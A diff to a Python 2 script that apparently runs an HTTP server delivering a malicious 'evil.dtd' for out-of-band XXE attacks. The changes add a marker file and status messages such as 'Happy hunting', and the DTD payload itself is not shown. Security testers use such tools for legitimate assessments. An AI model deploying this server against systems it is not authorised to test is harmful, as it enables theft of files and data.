@@ -2,7 +2,7 @@
 
 from BaseHTTPServer import BaseHTTPRequestHandler,HTTPServer
 from hashlib import sha1
-import sys
+import sys, os
 import urllib
 
 DTD_NAME = "evil.dtd"
@@ -69,12 +69,18 @@ def startServer(ip, port=8000):
         DTD_CONTENTS = DTD_TEMPLATE.format(ip, port)
         xxeHandler = makeCustomHandlerClass(DTD_NAME, DTD_CONTENTS )
         server = HTTPServer((ip, port), xxeHandler)
-        print '[+] started server on {}:{}'.format(ip,port)
+        #touches a file to let the other process know the server is running. super hacky
+        with open('.server_started','w') as check:
+            check.write('true')
+        print '\n[+] started server on {}:{}'.format(ip,port)
+        print '\n[+] Request away. Happy hunting.'
         print '[+] press Ctrl-C to close\n'
         server.serve_forever()
 
     except KeyboardInterrupt:
         print "\n...shutting down"
+        if os.path.exists('.server_started'):
+            os.remove('.server_started')
         server.socket.close()
         
 def usage():
